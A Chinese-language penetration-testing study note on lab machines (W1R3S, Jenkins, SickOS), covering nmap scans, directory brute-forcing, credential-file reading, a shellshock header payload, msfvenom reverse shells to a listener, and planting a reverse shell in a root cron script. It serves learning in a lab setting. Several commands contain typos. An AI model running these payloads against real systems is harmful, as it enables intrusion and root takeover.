---
title: 渗透思路笔记
id: 渗透思路笔记

---

<!-- more -->

[红队笔记的个人空间-红队笔记个人主页-哔哩哔哩视频 (bilibili.com)](https://space.bilibili.com/491748397/channel/collectiondetail?sid=821390)

视频有一个系列，打的靶场，主要是学思路，还有扩展工具和漏洞

## W1R3S

[「红队笔记」学渗透必打百台靶机实操精讲-W1R3S_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1mB4y1j7K6/?spm_id_from=333.788&vd_source=faef0441e8f81219c72917ecec338b4b)



### nmap--主机发现、端口扫描

[「红队笔记」主机发现和端口扫描的基本原理和工具选择_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1dg411b74a/?spm_id_from=333.999.0.0&vd_source=faef0441e8f81219c72917ecec338b4b)

官方命令手册

[Chapter 15. Nmap Reference Guide | Nmap Network Scanning](https://nmap.org/book/man.html)

[Nmap中文手册 - Nmap中文网](http://www.nmap.com.cn/doc/manual.shtm#4)

nmap脚本 [NSEDoc Reference Portal: NSE Categories — Nmap Scripting Engine documentation](https://nmap.org/nsedoc/categories/)  eg:

```shell
nmap --script=vuln
```

> 本次所用命令
>
> ```shell
> sudo nmap --minb-rate 10000 -p- 10.10.10.19 #端口扫描
> 
> sudo nmap -sT -sV -O -p22，3128，8080 10.10.10.19 
> #-sT tcp扫描，-sV版本扫描，-O系统扫描，-p指定端口，可以指定上一条扫描出的开放端口
> 
> sudo nmap -sU -p22，3128，8080 10.10.10.19 
> #-sU udp扫描
> ```
>
> 



### Dirble--目录爆破

[nccgroup/dirble：快速目录扫描和抓取工具 (github.com)](https://github.com/nccgroup/dirble)

### DirBuster--目录爆破

kali自带

### feroxbuster--目录爆破

kali自带

### SearchSploit--漏洞查询

kali自带

### John--hash碰撞

kali自带





## jenkins

初步获得系统权限，获取主机信息

```shell
whoami  	#当前用户
uname -a	#系统信息

#ip信息
ip a
ifconfig

dpkg -l		#Debian 软件包管理，查询安装软件

sudo -l 	#查看当前用户权限

cat /etc/passwd  	#查看各用户权限
```

### Crontab提权

[crontab提权 – 赛博网安wiki (allinsec.cn)](http://wiki.allinsec.cn/?p=510)

查看/etc/crontab下root用户的计划任务

```shell
cat /etc/crontab
或
cat /etc/cron.d
```

查看所执行的文件权限，若其他用户可写，则向该脚本文件中写入提权操作





## SickOS

### 解法一：

wolfcms上传shell，通过配置文件，同密码登录，权限提升

### 解法二：

#### nikto --web扫描，扫出shellshock漏洞

[sullo/nikto: Nikto web server scanner (github.com)](https://github.com/sullo/nikto)

```shell
sudo nikto -h 10.10.19 -useproxy http://10.10.19:3128
```

#### 通过3128的代理服务访问目标网站，验证shellshock漏洞

```shell
sudo curl -v --proxy http://10.10.10.19:3128 http://10.10.10.19/cgi-bin/status -H "Referer:() { test;}; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id;exit"
```

#### msf生成payload反弹shell

```shell
sudo msfvenom -p cmd/unix/reverse_basj lhost=10.10.10.3 lport=443 -f raw
```

#### 查看系统信息

```shell
whoami
uname -a
dpkg -l
```

知道系统信息为ubuntu，且安装了python，可以利用python起一个交互性更好的shell

```shell
pychon -c "import pty;pty.spawn('/bin/bash')"
```

#### 查看文件connect.py，提示自动计划

```shell
cd /etc
ls -liah cron*
```

#### msf生成python反弹shell，插入connect.py，监听获得root权限shell

```shell
sudo msfvenor -p cmd/unix/reverse_python lhost=10.10.10.3 lport=444 -f raw
```

